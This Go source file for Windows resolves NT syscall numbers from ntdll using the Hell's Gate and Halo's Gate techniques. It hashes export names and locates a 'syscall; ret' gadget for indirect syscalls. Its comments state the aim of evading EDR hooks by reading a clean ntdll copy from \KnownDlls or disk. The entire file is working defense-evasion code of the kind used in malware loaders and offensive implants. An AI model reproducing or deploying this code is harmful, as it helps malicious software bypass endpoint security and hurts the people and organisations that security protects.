//go:build windows

package win

import (
	"sync"
	"unsafe"
)

// ssnEntry records a resolved syscall number for an NT API.
type ssnEntry struct {
	Name string
	SSN  uintptr
	// gadget is the address of the "syscall; ret" sequence inside ntdll (used
	// by the L5 indirect call path). Two bytes: 0F 05 C3.
	gadget uintptr
}

// syscallGadget scans a module for a "syscall; ret" byte pattern. Reads the
// bytes directly (no per-byte allocation) so the scan is fast even on a 2MB
// image.
func syscallGadget(moduleBase uintptr, size int) uintptr {
	if moduleBase == 0 || size <= 0 {
		return 0
	}
	for off := 0; off < size-3; off++ {
		if *(*byte)(unsafe.Pointer(moduleBase + uintptr(off))) == 0x0F &&
			*(*byte)(unsafe.Pointer(moduleBase + uintptr(off) + 1)) == 0x05 &&
			*(*byte)(unsafe.Pointer(moduleBase + uintptr(off) + 2)) == 0xC3 {
			return moduleBase + uintptr(off)
		}
	}
	return 0
}

// gadgetOnce / gadgetVal cache the ntdll "syscall; ret" gadget address so the
// SSN table and the L5/L7 call paths share one scan result.
var (
	gadgetOnce sync.Once
	gadgetVal  uintptr
)

// syscallGadgetGlobal returns the cached ntdll syscall;ret gadget (L5/L7).
func syscallGadgetGlobal() uintptr {
	gadgetOnce.Do(func() {
		ntdll := ModuleNtdll()
		if ntdll == 0 {
			return
		}
		dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdll))
		if dos.e_magic != 0x5A4D {
			return
		}
		nt := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntdll + uintptr(dos.e_lfanew)))
		if nt.Signature != 0x00004550 {
			return
		}
		gadgetVal = syscallGadget(ntdll, int(nt.OptionalHeader.SizeOfImage))
	})
	return gadgetVal
}

// findSSN extracts the syscall number from an ntdll NtXxx stub using the strict
// Hell's Gate heuristic: a `mov eax, imm32` (opcode B8) whose value is a
// plausible syscall number AND which is followed by a `syscall` instruction
// (0F 05) within the next 16 bytes (the wow64-aware stubs have a conditional
// in between). `modEnd` bounds the read so a corrupt RVA can never fault the
// process.
func findSSN(stub, modEnd uintptr) (uintptr, bool) {
	if stub == 0 || stub+32 > modEnd {
		return 0, false
	}
	b := Peek(stub, 32)
	for i := 0; i < len(b)-7; i++ {
		if b[i] != 0xB8 {
			continue
		}
		ssn := uint32(b[i+1]) | uint32(b[i+2])<<8 | uint32(b[i+3])<<16 | uint32(b[i+4])<<24
		if ssn > 0x2000 {
			continue // implausible syscall number
		}
		for j := i + 5; j < len(b)-1 && j < i+21; j++ {
			if b[j] == 0x0F && b[j+1] == 0x05 {
				return uintptr(ssn), true
			}
		}
	}
	return 0, false
}

// table holds resolved SSNs keyed by export hash.
var ssnTable = map[uint32]ssnEntry{}

var ssnOnce sync.Once

// EnsureSSNs resolves the SSN table once (panic-safe). Callers that use the
// syscall / indirect call paths must invoke it first. It prefers the clean
// \KnownDlls / disk ntdll source (unhookable by post-boot EDR drivers) and
// falls back to in-memory Halo's Gate.
func EnsureSSNs() {
	ssnOnce.Do(func() {
		defer func() { recover() }()
		if err := ResolveSSNsClean(); err != nil {
			_ = ResolveSSNs()
		}
	})
}

// ResolveSSNs scans ntdll's exports, extracting the SSN of every Nt* function.
// Halo's Gate fallback: if a stub looks patched (no `mov eax` found), the
// neighbouring stub's SSN minus its index delta is used. Every memory read is
// bounds-checked against the module image so a corrupt export RVA can never
// fault the process.
func ResolveSSNs() error {
	ntdll := ModuleNtdll()
	if ntdll == 0 {
		return errNoNtdll
	}
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdll))
	if dos.e_magic != 0x5A4D {
		return errNoNtdll
	}
	nt := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntdll + uintptr(dos.e_lfanew)))
	if nt.Signature != 0x00004550 {
		return errNoNtdll
	}
	modEnd := ntdll + uintptr(nt.OptionalHeader.SizeOfImage)
	edir := nt.OptionalHeader.DataDirectory[0]
	if edir.VirtualAddress == 0 || uintptr(edir.VirtualAddress)+unsafe.Sizeof(IMAGE_EXPORT_DIRECTORY{}) > uintptr(nt.OptionalHeader.SizeOfImage) {
		return errNoNtdll
	}
	exp := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(ntdll + uintptr(edir.VirtualAddress)))
	names := unsafe.Slice((*uint32)(unsafe.Pointer(ntdll+uintptr(exp.AddressOfNames))), exp.NumberOfNames)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(ntdll+uintptr(exp.AddressOfNameOrdinals))), exp.NumberOfNames)
	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(ntdll+uintptr(exp.AddressOfFunctions))), exp.NumberOfFunctions)

	// First pass: extract SSNs for all stubs we can read.
	byIndex := map[uint32]uint32{} // ordinal → ssn
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		ord := ords[i]
		if int(ord) >= len(funcs) {
			continue
		}
		stub := ntdll + uintptr(funcs[ord])
		if ssn, ok := findSSN(stub, modEnd); ok {
			byIndex[uint32(ord)] = uint32(ssn)
		}
	}
	// Halo's Gate: any ordinal missing an SSN gets the value of the nearest
	// lower ordinal + the offset (the EDR usually patches only the mov eax).
	for ord := uint32(0); ord < exp.NumberOfFunctions; ord++ {
		if _, ok := byIndex[ord]; ok {
			continue
		}
		// walk down to the previous known SSN
		base := uint32(0)
		steps := uint32(0)
		for j := int(ord) - 1; j >= 0; j-- {
			steps++
			if v, ok := byIndex[uint32(j)]; ok {
				base = v + steps
				break
			}
		}
		byIndex[ord] = base
	}

	gadget := syscallGadgetGlobal()
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		ord := ords[i]
		if int(ord) >= len(funcs) {
			continue
		}
		namePtr := ntdll + uintptr(names[i])
		if namePtr >= modEnd {
			continue
		}
		name := cStringBounded(namePtr, modEnd)
		if len(name) > 2 && name[0] == 'N' && name[1] == 't' {
			ssnTable[hashAnsi(name)] = ssnEntry{Name: name, SSN: uintptr(byIndex[uint32(ord)]), gadget: gadget}
		}
	}
	return nil
}

// ResolveSSNsClean repopulates the SSN table from a clean ntdll image that an
// EDR could not hook: first the \KnownDlls\ntdll.dll kernel section (created at
// boot), then the on-disk copy via LoadLibraryEx(DONT_RESOLVE_DLL_REFERENCES).
// Falls back to ResolveSSNs() (in-memory Halo's Gate) when neither is
// available. This is strictly more resistant to EDR stubbing than reading the
// live ntdll image.
func ResolveSSNsClean() error {
	ssnTable = map[uint32]ssnEntry{}
	if ntdllClean, ok := mapKnownDllsNtdll(); ok {
		parseCleanNtdll(ntdllClean)
		if len(ssnTable) > 0 {
			return nil
		}
	}
	if h, ok := mapNtdllFromDisk(); ok {
		parseCleanNtdll(h)
		if len(ssnTable) > 0 {
			return nil
		}
	}
	ssnTable = map[uint32]ssnEntry{}
	return ResolveSSNs()
}

// parseCleanNtdll fills ssnTable from an arbitrary clean ntdll base (section or
// disk image). Every read is bounds-checked against SizeOfImage.
func parseCleanNtdll(ntdll uintptr) {
	defer func() { _ = recover() }()
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(ntdll))
	if dos.e_magic != 0x5A4D {
		return
	}
	nt := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntdll + uintptr(dos.e_lfanew)))
	if nt.Signature != 0x00004550 {
		return
	}
	modEnd := ntdll + uintptr(nt.OptionalHeader.SizeOfImage)
	edir := nt.OptionalHeader.DataDirectory[0]
	if edir.VirtualAddress == 0 || uintptr(edir.VirtualAddress)+unsafe.Sizeof(IMAGE_EXPORT_DIRECTORY{}) > uintptr(nt.OptionalHeader.SizeOfImage) {
		return
	}
	exp := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(ntdll + uintptr(edir.VirtualAddress)))
	names := unsafe.Slice((*uint32)(unsafe.Pointer(ntdll+uintptr(exp.AddressOfNames))), exp.NumberOfNames)
	ords := unsafe.Slice((*uint16)(unsafe.Pointer(ntdll+uintptr(exp.AddressOfNameOrdinals))), exp.NumberOfNames)
	funcs := unsafe.Slice((*uint32)(unsafe.Pointer(ntdll+uintptr(exp.AddressOfFunctions))), exp.NumberOfFunctions)

	byIndex := map[uint32]uint32{}
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		ord := ords[i]
		if int(ord) >= len(funcs) {
			continue
		}
		stub := ntdll + uintptr(funcs[ord])
		if ssn, ok := findSSN(stub, modEnd); ok {
			byIndex[uint32(ord)] = uint32(ssn)
		}
	}
	for ord := uint32(0); ord < exp.NumberOfFunctions; ord++ {
		if _, ok := byIndex[ord]; ok {
			continue
		}
		base := uint32(0)
		steps := uint32(0)
		for j := int(ord) - 1; j >= 0; j-- {
			steps++
			if v, ok := byIndex[uint32(j)]; ok {
				base = v + steps
				break
			}
		}
		byIndex[ord] = base
	}

	gadget := syscallGadgetGlobal()
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		ord := ords[i]
		if int(ord) >= len(funcs) {
			continue
		}
		namePtr := ntdll + uintptr(names[i])
		if namePtr >= modEnd {
			continue
		}
		name := cStringBounded(namePtr, modEnd)
		if len(name) > 2 && name[0] == 'N' && name[1] == 't' {
			ssnTable[hashAnsi(name)] = ssnEntry{Name: name, SSN: uintptr(byIndex[uint32(ord)]), gadget: gadget}
		}
	}
}

// SSN returns the resolved syscall number for an NT API name hash.
func SSN(hash uint32) (ssnEntry, bool) {
	e, ok := ssnTable[hash]
	return e, ok
}

// HasGadget reports whether a syscall;ret gadget was found (L5 availability).
func (e ssnEntry) HasGadget() bool { return e.gadget != 0 }

// SSNByName looks up a syscall entry by export name.
func SSNByName(name string) (ssnEntry, bool) {
	e, ok := ssnTable[hashAnsi(name)]
	return e, ok
}

var errNoNtdll = &noNtdllError{}

type noNtdllError struct{}

func (e *noNtdllError) Error() string { return "win: ntdll module not found" }
